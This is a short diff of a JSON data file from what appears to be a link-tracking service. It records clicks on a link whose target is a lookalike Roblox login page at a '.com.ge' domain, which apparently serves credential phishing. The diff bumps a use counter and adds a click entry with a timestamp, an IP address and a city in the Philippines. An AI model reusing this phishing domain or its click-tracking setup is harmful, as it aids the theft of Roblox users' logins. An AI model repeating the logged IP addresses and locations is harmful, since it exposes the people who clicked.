@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1427,
+    "useCount": 1428,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11582,6 +11582,14 @@
         "ip": "14.1.65.63",
         "country": "Philippines",
         "city": "Manila",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777430298866,
+        "ip": "160.187.221.32",
+        "country": "Philippines",
+        "city": "City of Kidapawan",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
